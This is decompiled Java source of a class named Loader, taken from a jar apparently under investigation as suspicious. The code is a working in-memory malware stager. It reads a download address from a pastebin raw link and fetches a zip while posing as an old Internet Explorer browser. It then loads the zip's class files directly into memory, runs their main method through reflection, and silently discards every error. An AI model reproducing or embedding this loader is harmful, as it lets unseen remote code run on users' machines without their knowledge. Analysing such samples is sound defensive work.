/*    */ package idasido.adldaosd.wpiw.client;
/*    */ 
/*    */ import java.io.BufferedReader;
/*    */ import java.io.ByteArrayOutputStream;
/*    */ import java.io.InputStream;
/*    */ import java.io.InputStreamReader;
/*    */ import java.net.HttpURLConnection;
/*    */ import java.net.URL;
/*    */ import java.util.zip.ZipEntry;
/*    */ import java.util.zip.ZipInputStream;
/*    */ 
/*    */ 
/*    */ public class Loader
/*    */ {
/*    */   public static void main(String[] args) {
/*    */     try {
/* 17 */       ByteLoader loader = new ByteLoader();
/*    */       
/* 19 */       URL pastebin = new URL("https://pastebin.com/raw/vZ31eQAb");
/* 20 */       BufferedReader reader = new BufferedReader(new InputStreamReader(pastebin.openConnection().getInputStream()));
/* 21 */       String fileURL = reader.readLine();
/* 22 */       URL url = new URL(fileURL);
/*    */       
/* 24 */       HttpURLConnection httpURLConnection = (HttpURLConnection)url.openConnection();
/* 25 */       httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
/* 26 */       InputStream inputStream = httpURLConnection.getInputStream();
/*    */       
/* 28 */       ZipInputStream zipInputStream = new ZipInputStream(inputStream);
/*    */       
/*    */       ZipEntry zipEntry;
/* 31 */       while ((zipEntry = zipInputStream.getNextEntry()) != null) {
/* 32 */         String name = zipEntry.getName();
/*    */         
/* 34 */         if (!name.endsWith(".class"))
/*    */           continue; 
/* 36 */         name = name.substring(0, name.length() - 6);
/* 37 */         name = name.replace('/', '.');
/*    */         
/* 39 */         ByteArrayOutputStream streamBuilder = new ByteArrayOutputStream();
/*    */         
/* 41 */         byte[] tempBuffer = new byte[16384]; int bytesRead;
/* 42 */         for (; (bytesRead = zipInputStream.read(tempBuffer)) != -1; streamBuilder.write(tempBuffer, 0, bytesRead));
/*    */         
/* 44 */         loader.classes.put(name, streamBuilder.toByteArray());
/*    */       } 
/*    */ 
/*    */ 
/*    */       
/* 49 */       loader.findClass("idasido.adldaosd.wpiw.Main").getMethod("main", new Class[0]).invoke(null, new Object[0]);
/*    */     }
/* 51 */     catch (Exception exception) {}
/*    */   }
/*    */ }


/* Location:              C:\Users\aesthetical\Downloads\investagate\COPE-1.0-SNAPSHOT-client.jar!\idasido\adldaosd\wpiw\client\Loader.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */